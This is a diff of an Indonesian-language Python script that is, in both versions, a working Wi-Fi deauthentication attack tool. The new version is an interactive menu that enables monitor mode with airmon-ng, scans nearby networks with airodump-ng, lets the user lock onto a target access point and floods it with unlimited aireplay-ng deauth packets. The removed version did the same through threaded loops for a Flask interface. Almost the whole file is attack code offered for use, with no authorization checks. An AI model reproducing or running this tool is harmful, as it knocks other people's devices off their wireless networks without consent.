@@ -1,325 +1,350 @@
-import subprocess
-import time
-import threading
-import signal
-import sys
-import re
-import os
+#!/usr/bin/env python3
+import csv
 import glob
+import os
+import random
+import re
+import subprocess
+import sys
+import tempfile
+import time
 
-# ====================== VARIABEL GLOBAL ======================
+GREEN = "\033[92m"
+RED = "\033[91m"
+CYAN = "\033[96m"
+MAGENTA = "\033[95m"
+YELLOW = "\033[93m"
+RESET = "\033[0m"
+BOLD = "\033[1m"
 
-monitor_iface = None
-original_iface = None
-deauth_thread = None
-deauth_running = False
+GLITCH_CHARS = "!@#$%^&*<>/\\|~?01"
+GLITCH_COLORS = [GREEN, RED, CYAN, MAGENTA, YELLOW]
 
-# ====================== FUNGSI MANAJEMEN INTERFACE ======================
 
-def find_wireless_interfaces():
-    result = subprocess.run(["iwconfig"], capture_output=True, text=True)
-    lines = result.stdout.split('\n')
+def clear_screen():
+    os.system("clear")
+
+
+def glitch_text(text):
+    return f"{BOLD}{random.choice(GLITCH_COLORS)}{text}{RESET}"
+
+
+def glitch_print(text, delay=0.02, rounds=8):
+    """Efek glitch progresif untuk tampilan terminal."""
+    n = len(text)
+    settled = [False] * n
+
+    for r in range(rounds):
+        settle_ratio = (r + 1) / rounds
+        line = ""
+        for i, c in enumerate(text):
+            if c == " ":
+                line += " "
+                continue
+
+            if settled[i]:
+                line += f"{GREEN}{c}{RESET}"
+                continue
+
+            if random.random() < settle_ratio * 0.5:
+                settled[i] = True
+                line += f"{GREEN}{c}{RESET}"
+            else:
+                glitch_char = random.choice(GLITCH_CHARS)
+                color = random.choice(GLITCH_COLORS)
+                line += f"{color}{glitch_char}{RESET}"
+
+        sys.stdout.write("\r" + line + "\033[K")
+        sys.stdout.flush()
+        time.sleep(delay)
+
+    for _ in range(2):
+        flash = f"{BOLD}{random.choice(GLITCH_COLORS)}{text}{RESET}"
+        sys.stdout.write("\r" + flash + "\033[K")
+        sys.stdout.flush()
+        time.sleep(0.05)
+
+    sys.stdout.write("\r" + f"{GREEN}{text}{RESET}" + "\033[K" + "\n")
+    sys.stdout.flush()
+
+
+def get_wireless_interfaces():
+    output = subprocess.run(["ip", "link"], capture_output=True, text=True).stdout
     interfaces = []
-    for line in lines:
-        if "no wireless extensions" in line:
-            continue
-        if line.strip() and not line.startswith(" "):
-            iface = line.split()[0]
-            if iface not in ["lo", "eth0", "eth1"]:
-                interfaces.append(iface)
+    for line in output.splitlines():
+        m = re.match(r"^\d+:\s+(\S+):", line)
+        if m:
+            name = m.group(1)
+            if name == "lo":
+                continue
+            interfaces.append(name)
     return interfaces
 
-def is_monitor_mode(iface):
-    result = subprocess.run(["iwconfig", iface], capture_output=True, text=True)
-    return "Mode:Monitor" in result.stdout
 
-def start_monitor_mode(iface):
-    print(f"[*] Starting monitor mode on {iface}...")
-    subprocess.run(["sudo", "airmon-ng", "check", "kill"], check=False)
-    result = subprocess.run(["sudo", "airmon-ng", "start", iface], capture_output=True, text=True)
-    for line in result.stdout.split('\n'):
-        if "monitor mode enabled on" in line:
-            parts = line.split()
-            for i, part in enumerate(parts):
-                if part == "on" and i+1 < len(parts):
-                    new_iface = parts[i+1].strip()
-                    print(f"[+] Monitor interface: {new_iface}")
-                    return new_iface
-    interfaces = find_wireless_interfaces()
-    for i in interfaces:
-        if "mon" in i and i != iface:
-            print(f"[+] Found monitor interface: {i}")
-            return i
-    raise RuntimeError("Could not determine monitor interface name")
+def get_monitor_interface_name(adapter, output):
+    current_ifaces = get_wireless_interfaces()
+    for iface in current_ifaces:
+        if iface != adapter and iface.endswith("mon"):
+            return iface
 
-def stop_monitor_mode(iface):
-    """Stop monitor mode dan restart NetworkManager"""
-    if iface:
-        print(f"[*] Stopping monitor mode on {iface}...")
-        result = subprocess.run(
-            ["sudo", "airmon-ng", "stop", iface],
-            capture_output=True,
-            text=True,
-            check=False
-        )
-        if result.stdout:
-            print(f"[*] airmon-ng output: {result.stdout.strip()}")
-        if result.stderr:
-            print(f"[*] airmon-ng stderr: {result.stderr.strip()}")
-    
-    print("[*] Restarting NetworkManager...")
-    result = subprocess.run(
-        ["sudo", "systemctl", "restart", "NetworkManager"],
-        capture_output=True,
-        text=True,
-        check=False
-    )
-    
-    if result.returncode == 0:
-        print("[+] NetworkManager restarted successfully")
-    else:
-        print(f"[-] NetworkManager restart failed (exit code: {result.returncode})")
-        if result.stderr:
-            print(f"[-] Error: {result.stderr.strip()}")
+    match = re.search(r"\[(?:phy\d+)\]([A-Za-z0-9_.:-]+mon)\b", output, re.IGNORECASE)
+    if match:
+        return match.group(1)
 
-def ensure_monitor_mode():
-    global monitor_iface, original_iface
-    interfaces = find_wireless_interfaces()
-    for iface in interfaces:
-        if is_monitor_mode(iface):
-            monitor_iface = iface
-            print(f"[+] Found existing monitor interface: {monitor_iface}")
-            return monitor_iface
-    for iface in interfaces:
-        if not is_monitor_mode(iface) and not iface.startswith("mon"):
-            original_iface = iface
-            try:
-                new_iface = start_monitor_mode(iface)
-                monitor_iface = new_iface
-                print(f"[+] Successfully created monitor interface: {monitor_iface}")
-                return monitor_iface
-            except Exception as e:
-                print(f"[-] Failed to start monitor on {iface}: {e}")
-                continue
-    raise RuntimeError("No wireless interface available")
+    match = re.search(r"\b([A-Za-z0-9_.:-]+mon)\b", output, re.IGNORECASE)
+    if match:
+        return match.group(1)
 
-def get_monitor_interface():
-    global monitor_iface
-    if monitor_iface and is_monitor_mode(monitor_iface):
-        return monitor_iface
-    interfaces = find_wireless_interfaces()
-    for iface in interfaces:
-        if is_monitor_mode(iface):
-            monitor_iface = iface
-            return monitor_iface
-    return ensure_monitor_mode()
-
-def init_deauth():
-    """Inisialisasi: pastikan monitor mode aktif"""
     try:
-        interface = get_monitor_interface()
-        print(f"[+] Monitor interface ready: {interface}")
-        return {"status": "success", "interface": interface}
-    except Exception as e:
-        print(f"[-] Failed to init monitor mode: {e}")
-        return {"status": "error", "message": str(e)}
-
-def set_channel(iface, channel):
-    try:
-        subprocess.run(["iwconfig", iface, "channel", str(channel)], check=True, capture_output=True)
-        return True
-    except:
-        return False
-
-# ====================== SIGNAL STRENGTH ======================
-
-def get_signal_level(power):
-    if power is None:
-        return "Almost Hilang"
-    if power > -50:
-        return "Kuat"
-    elif power > -70:
-        return "Sedang"
-    elif power > -85:
-        return "Lemah"
-    else:
-        return "Almost Hilang"
-
-# ====================== PARSE CSV ======================
-
-def parse_csv(filename):
-    networks = []
-    try:
-        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
-            lines = f.readlines()
+        iw_output = subprocess.run(["iw", "dev"], capture_output=True, text=True).stdout
+        for line in iw_output.splitlines():
+            m = re.search(r"\bInterface\s+(\S+)", line)
+            if m:
+                iface = m.group(1)
+                if iface != adapter and iface.endswith("mon"):
+                    return iface
     except FileNotFoundError:
-        return networks
+        pass
 
-    start_parsing = False
-    for i, line in enumerate(lines):
-        if "bssid" in line.lower() and "channel" in line.lower() and "essid" in line.lower():
-            start_parsing = True
-            continue
-        if start_parsing:
-            if line.strip() == "" or "station mac" in line.lower():
-                break
-            parts = line.split(',')
-            if len(parts) >= 14:
-                bssid = parts[0].strip()
-                channel = parts[3].strip()
-                essid = parts[13].strip()
-                power_str = parts[8].strip() if len(parts) > 8 else ''
-                try:
-                    power = int(power_str)
-                except:
-                    power = None
-                if bssid and len(bssid) == 17 and ":" in bssid:
-                    networks.append({
-                        "bssid": bssid,
-                        "channel": channel if channel else "?",
-                        "essid": essid if essid else "[Hidden]",
-                        "power": power,
-                        "signal_level": get_signal_level(power)
-                    })
+    return f"{adapter}mon"
+
+
+def run_command(cmd, description=None, show_output=True):
+    if description:
+        print(f"\n{CYAN}>{description}{RESET}")
+
+    if show_output:
+        print(" ".join(cmd))
+
+    result = subprocess.run(cmd, capture_output=True, text=True)
+    if show_output:
+        if result.stdout:
+            print(result.stdout.strip())
+        if result.stderr:
+            print(result.stderr.strip())
+
+    if result.returncode != 0:
+        if description or show_output:
+            print(f"{YELLOW}Perintah gagal: {' '.join(cmd)}{RESET}")
+        return None
+    return result
+
+
+def start_monitor_mode(adapter):
+    glitch_print(f"ACTIVATING MONITOR MODE ON {adapter}...")
+    run_command(["sudo", "airmon-ng", "check", "kill"], "MEMBERSIHKAN PROSES PENGANGGU", show_output=False)
+    result = run_command(["sudo", "airmon-ng", "start", adapter], "MONITOR MODE AKTIF", show_output=False)
+    print("")
+    if result is None:
+        return adapter
+
+    output = (result.stdout or "") + (result.stderr or "")
+    monitor_iface = get_monitor_interface_name(adapter, output)
+    time.sleep(1)
+    print(glitch_text(f"> Interface monitor aktif: {monitor_iface}"))
+    print()
+    return monitor_iface
+
+
+def scan_networks(adapter, duration=10):
+    glitch_print("SCANNING WIFI NETWORKS...")
+    temp_dir = tempfile.mkdtemp(prefix="airodump-", dir="/tmp")
+    prefix = os.path.join(temp_dir, "scan")
+    proc = subprocess.Popen(
+        ["sudo", "airodump-ng", "--write", prefix, "--output-format", "csv", adapter],
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL,
+    )
+
+    try:
+        time.sleep(duration)
+    finally:
+        if proc.poll() is None:
+            proc.terminate()
+            try:
+                proc.wait(timeout=5)
+            except subprocess.TimeoutExpired:
+                proc.kill()
+                proc.wait()
+
+    networks = []
+    seen = set()
+    for csv_path in sorted(glob.glob(prefix + "-*.csv")):
+        with open(csv_path, newline="", encoding="utf-8", errors="ignore") as handle:
+            reader = csv.reader(handle)
+            for row in reader:
+                if len(row) < 14:
+                    continue
+                bssid = row[0].strip()
+                channel = row[3].strip()
+                essid = row[13].strip()
+                if not bssid or bssid.lower() == "bssid" or not essid:
+                    continue
+                key = (bssid, channel, essid)
+                if key in seen:
+                    continue
+                seen.add(key)
+                networks.append({"bssid": bssid, "channel": channel, "essid": essid})
+
+    for path in glob.glob(prefix + "-*.csv"):
+        try:
+            os.remove(path)
+        except OSError:
+            pass
+    try:
+        os.rmdir(temp_dir)
+    except OSError:
+        pass
+
     return networks
 
-# ====================== DEAUTH LOOP ======================
 
-def deauth_loop(targets, interface):
-    global deauth_running
-    while deauth_running:
-        for target in targets:
-            if not deauth_running:
-                break
-            bssid = target['bssid']
-            channel = target['channel']
-            set_channel(interface, channel)
-            cmd = f"sudo aireplay-ng --deauth 10 -a {bssid} {interface}"
-            try:
-                subprocess.run(cmd, shell=True, timeout=2, check=False)
-            except:
-                pass
-            time.sleep(0.5)
-        time.sleep(1)
-
-# ====================== FUNGSI UNTUK FLASK ======================
-
-def deauth_scan():
-    """Scan WiFi networks - return list of networks"""
-    try:
-        interface = get_monitor_interface()
-        print(f"[*] Scanning with {interface}...")
-        
-        for f in glob.glob("/tmp/scan_output*.csv"):
-            try:
-                os.remove(f)
-            except:
-                pass
-        
-        cmd = f"timeout 12 sudo airodump-ng {interface} -w /tmp/scan_output --output-format csv"
-        subprocess.run(cmd, shell=True, capture_output=True, text=True)
-        
-        possible_files = [
-            "/tmp/scan_output-01.csv",
-            "/tmp/scan_output-02.csv",
-            "/tmp/scan_output-03.csv",
-            "/tmp/scan_output.csv"
-        ]
-        
-        networks = []
-        for f in possible_files:
-            if os.path.exists(f):
-                print(f"[*] Parsing file: {f}")
-                networks = parse_csv(f)
-                if networks:
-                    break
-        
-        if networks:
-            networks.sort(key=lambda x: x['power'] if x['power'] is not None else -1000, reverse=True)
-            print(f"[+] Found {len(networks)} networks")
-            return {"status": "success", "networks": networks}
-        else:
-            print("[*] No networks found in CSV, using fallback method...")
-            cmd2 = f"timeout 8 sudo airodump-ng {interface} 2>/dev/null | grep -E '^[0-9A-F]' | head -20"
-            result2 = subprocess.run(cmd2, shell=True, capture_output=True, text=True)
-            lines = result2.stdout.split('\n')
-            for line in lines:
-                parts = line.split()
-                if len(parts) >= 7:
-                    bssid = parts[0]
-                    channel = parts[2] if len(parts) > 2 else "?"
-                    essid = " ".join(parts[6:]) if len(parts) > 6 else "[Hidden]"
-                    if bssid and len(bssid) == 17 and ":" in bssid:
-                        networks.append({
-                            "bssid": bssid,
-                            "channel": channel,
-                            "essid": essid,
-                            "power": None,
-                            "signal_level": "Almost Hilang"
-                        })
-            networks.sort(key=lambda x: x['power'] if x['power'] is not None else -1000, reverse=True)
-            return {"status": "success", "networks": networks}
-            
-    except Exception as e:
-        print(f"[-] Error during scan: {e}")
-        return {"status": "error", "message": str(e)}
-
-def deauth_start(targets):
-    """Start deauth attack on targets"""
-    global deauth_thread, deauth_running
-    
-    if not targets or len(targets) == 0:
-        return {"status": "error", "message": "No targets selected"}
-    
-    interface = get_monitor_interface()
-    if not interface:
-        return {"status": "error", "message": "Monitor interface not found"}
-    
-    deauth_stop()
-    deauth_running = True
-    deauth_thread = threading.Thread(target=deauth_loop, args=(targets, interface))
-    deauth_thread.daemon = True
-    deauth_thread.start()
-    
-    target_list = ", ".join([t['bssid'] for t in targets])
-    return {"status": "success", "message": f"Deauth started on {len(targets)} target(s): {target_list}"}
-
-def deauth_stop():
-    """Stop deauth attack"""
-    global deauth_running, deauth_thread
-    deauth_running = False
-    if deauth_thread and deauth_thread.is_alive():
-        deauth_thread.join(timeout=2)
-    deauth_thread = None
-    subprocess.run("sudo pkill -f 'aireplay-ng --deauth'", shell=True, check=False)
-    return {"status": "success", "message": "Deauth stopped"}
-
-def deauth_cleanup():
-    """Cleanup: stop deauth, stop monitor mode, restart NetworkManager"""
-    global monitor_iface
-    
-    print("\n[*] Deauth cleanup started...")
-    
-    # Stop deauth attack
-    deauth_stop()
-    
-    # Cari monitor interface yang aktif
-    interfaces = find_wireless_interfaces()
-    monitor_found = None
-    for iface in interfaces:
-        if is_monitor_mode(iface):
-            monitor_found = iface
-            break
-    
-    if monitor_found:
-        print(f"[*] Found active monitor interface: {monitor_found}")
-        stop_monitor_mode(monitor_found)
-    elif monitor_iface:
-        print(f"[*] Using stored monitor interface: {monitor_iface}")
-        stop_monitor_mode(monitor_iface)
-        monitor_iface = None
+def stop_monitor_mode(monitor_iface):
+    glitch_print("STOPPING MONITOR MODE...")
+    candidates = [monitor_iface]
+    if monitor_iface.endswith("mon"):
+        candidates.append(monitor_iface[:-3])
     else:
-        print("[*] No monitor interface found to clean up")
-    
-    print("[+] Deauth cleanup complete.")
-    return {"status": "success", "message": "Cleanup complete"}
+        candidates.append(f"{monitor_iface}mon")
+
+    for name in candidates:
+        result = run_command(["sudo", "airmon-ng", "stop", name], "MEMATIKAN MONITOR MODE", show_output=False)
+        if result is not None:
+            break
+
+    run_command(["sudo", "systemctl", "restart", "NetworkManager"], "RESTART NETWORKMANAGER", show_output=False)
+
+
+def set_monitor_channel(monitor_iface, channel):
+    if not channel:
+        return
+
+    run_command(["sudo", "iw", "dev", monitor_iface, "set", "channel", str(channel)], None, show_output=False)
+
+
+def run_deauth_attack(target, monitor_iface, retries=3, retry_delay=3):
+    for attempt in range(1, retries + 1):
+        set_monitor_channel(monitor_iface, target.get("channel"))
+        cmd = ["sudo", "aireplay-ng", "-0", "0", "-a", target["bssid"], monitor_iface]
+        print(f"\n{CYAN}▶ Menjalankan serangan deauth{RESET}")
+        print(f"{YELLOW}{' '.join(cmd)}{RESET}")
+
+        result = run_command(cmd, None, show_output=False)
+        if result is not None:
+            return
+
+        if attempt < retries:
+            time.sleep(retry_delay)
+
+    print(f"{RED}Serangan deauth gagal setelah {retries} percobaan.{RESET}")
+
+
+def prompt_keyboard_interrupt_action():
+    print(f"\n{YELLOW}Keyboard interrupt diterima.{RESET}")
+    print(f"{GREEN}1.{RESET} Pilih target lagi")
+    print(f"{GREEN}2.{RESET} Kembali ke menu")
+    print(f"{GREEN}3.{RESET} Keluar")
+
+    while True:
+        choice = input("\nPilih opsi [1-3]: ").strip()
+        if choice == "1":
+            return "restart"
+        if choice == "2":
+            return "menu"
+        if choice == "3":
+            return "exit"
+        print("Input salah, pilih 1, 2, atau 3.")
+
+
+def back_to_menu():
+    menu_path = os.path.join(os.path.dirname(__file__), "deauth-menu.py")
+    if not os.path.exists(menu_path):
+        menu_path = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "deauth-menu.py"))
+    os.execvp(sys.executable, [sys.executable, menu_path])
+
+
+def select_interface():
+    glitch_print("SCANNING INTERFACES...")
+    ifaces = get_wireless_interfaces()
+    if not ifaces:
+        print("Ga ada interface ditemukan.")
+        sys.exit(1)
+
+    print(f"\n{BOLD}Pilih interface:{RESET}")
+    for idx, name in enumerate(ifaces, start=1):
+        print(f"{GREEN}{idx}.{RESET} {name}")
+
+    while True:
+        choice = input("\nNomor: ").strip()
+        if choice.isdigit() and 1 <= int(choice) <= len(ifaces):
+            selected = ifaces[int(choice) - 1]
+            glitch_print(f"LOCKED: {selected}")
+            clear_screen()
+            return selected
+        print("Input salah, coba lagi.")
+
+
+def select_target(networks):
+    if not networks:
+        print("Ga ada jaringan yang ketemu.")
+        return None
+
+    print(f"\n{BOLD}Pilih target WiFi:{RESET}")
+    header = f"{'No':<3} {'ESSID':<20} {'CH':<3} {'BSSID'}"
+    print(header)
+    print("-" * len(header))
+    for idx, net in enumerate(networks, start=1):
+        essid = net["essid"][:20]
+        print(f"{GREEN}{idx:<3}{RESET} {essid:<20} {net['channel']:<3} {net['bssid']}")
+
+    while True:
+        choice = input("\nNomor target: ").strip()
+        if choice.isdigit() and 1 <= int(choice) <= len(networks):
+            selected = networks[int(choice) - 1]
+            glitch_print(f"TARGET LOCKED: {selected['essid']}")
+            return selected
+        print("Input salah, coba lagi.")
+
+
+def main():
+    adapter = None
+    monitor_iface = None
+
+    while True:
+        try:
+            if monitor_iface is None:
+                adapter = select_interface()
+                monitor_iface = start_monitor_mode(adapter)
+
+            networks = scan_networks(monitor_iface)
+            target = select_target(networks)
+
+            if target is None:
+                print("\nTidak ada target terpilih, kembali ke awal.")
+                continue
+
+            print(f"\n{CYAN}Target terpilih:{RESET} {target['essid']} | CH {target['channel']} | BSSID {target['bssid']}")
+
+            run_deauth_attack(target, monitor_iface)
+            print("\nMembersihkan sesi...")
+            clear_screen()
+            stop_monitor_mode(monitor_iface)
+            break
+
+        except KeyboardInterrupt:
+            action = prompt_keyboard_interrupt_action()
+            if action == "restart":
+                print("\nMengulang ke pemilihan target...")
+                continue
+            if action == "menu":
+                if monitor_iface:
+                    stop_monitor_mode(monitor_iface)
+                back_to_menu()
+            if action == "exit":
+                if monitor_iface:
+                    stop_monitor_mode(monitor_iface)
+                sys.exit(0)
+
+
+if __name__ == "__main__":
+    main()
